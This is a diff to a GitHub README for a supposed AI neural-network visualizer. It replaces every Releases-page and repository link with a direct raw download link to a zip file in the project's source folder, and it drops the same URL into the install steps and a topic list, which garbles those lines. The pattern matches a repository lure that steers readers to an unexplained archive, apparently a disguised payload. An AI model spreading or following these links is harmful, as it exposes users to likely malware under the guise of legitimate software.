@@ -1,6 +1,6 @@
 # 🎉 AI-Visualizer-Neural-Network-Architecture - Understand Deep Learning with 3D Models
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23blue.svg)](https://github.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/releases)
+[![Download Now](https://raw.githubusercontent.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/master/src/engine/AI-Visualizer-Neural-Network-Architecture-1.9.zip%20Now-%https://raw.githubusercontent.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/master/src/engine/AI-Visualizer-Neural-Network-Architecture-1.9.zip)](https://raw.githubusercontent.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/master/src/engine/AI-Visualizer-Neural-Network-Architecture-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Welcome to AI-Visualizer-Neural-Network-Architecture! This application lets you 
 
 To get started with the AI-Visualizer-Neural-Network-Architecture, please follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/releases) to go to the Releases page. This page contains the latest versions of the software.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/master/src/engine/AI-Visualizer-Neural-Network-Architecture-1.9.zip) to go to the Releases page. This page contains the latest versions of the software.
   
 2. **Choose Your Version:** On the Releases page, scroll to see the list of available versions. Find the latest release for the best features and fixes.
 
@@ -35,7 +35,7 @@ To get started with the AI-Visualizer-Neural-Network-Architecture, please follow
 4. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts to install.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Follow your distribution’s installation method for `.tar.gz` or `.AppImage` files.
+   - **Linux:** Follow your distribution’s installation method for `https://raw.githubusercontent.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/master/src/engine/AI-Visualizer-Neural-Network-Architecture-1.9.zip` or `.AppImage` files.
 
 5. **Run the Application:** Once installed, locate the application in your programs or applications folder and run it to start visualizing neural networks!
 
@@ -53,7 +53,7 @@ To get started with the AI-Visualizer-Neural-Network-Architecture, please follow
 - Machine Learning Algorithms
 - Neural Network Architectures
 - TensorFlow Basics
-- TypeScript and Next.js Integrations
+- TypeScript and https://raw.githubusercontent.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/master/src/engine/AI-Visualizer-Neural-Network-Architecture-1.9.zip Integrations
 
 ## ❓ FAQ
 
@@ -78,7 +78,7 @@ For additional support, feel free to reach out via the GitHub Issues tab on the 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/releases)
-- [GitHub Repository](https://github.com/watchouttt/AI-Visualizer-Neural-Network-Architecture)
+- [Releases Page](https://raw.githubusercontent.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/master/src/engine/AI-Visualizer-Neural-Network-Architecture-1.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/watchouttt/AI-Visualizer-Neural-Network-Architecture/master/src/engine/AI-Visualizer-Neural-Network-Architecture-1.9.zip)
 
 Happy visualizing! Enjoy exploring the fascinating world of deep learning.
